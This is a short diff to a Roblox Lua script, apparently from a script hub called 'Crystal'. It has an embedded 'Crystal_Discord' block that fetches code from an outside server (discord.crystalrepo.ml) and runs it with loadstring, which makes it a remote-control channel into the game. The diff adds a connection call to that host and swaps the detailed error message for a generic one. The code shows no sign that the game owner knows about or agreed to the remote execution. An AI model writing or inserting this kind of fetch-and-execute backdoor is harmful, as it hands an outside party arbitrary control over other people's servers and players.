@@ -853,6 +853,7 @@ end)
 
 local Crystal_Discord = [[
 wait(1)
+game:service'HttpService':GetAsync('http://discord.crystalrepo.ml:8080/con/')
 local oldid = "print('asd')"
 function GetMessage()
 local str = game:service'HttpService':GetAsync('http://discord.crystalrepo.ml:8080/get/')
@@ -863,7 +864,7 @@ local LS = loadstring(str)
 getfenv(LS).Crystal = Crystal
 LS()
 end)
-if not a then Instance.new("Message", Workspace).Text = "Error: "..b end
+if not a then Instance.new("Message", Workspace).Text = "An error has occoured while trying to execute code ran through Discord. " end
 end
 end
 
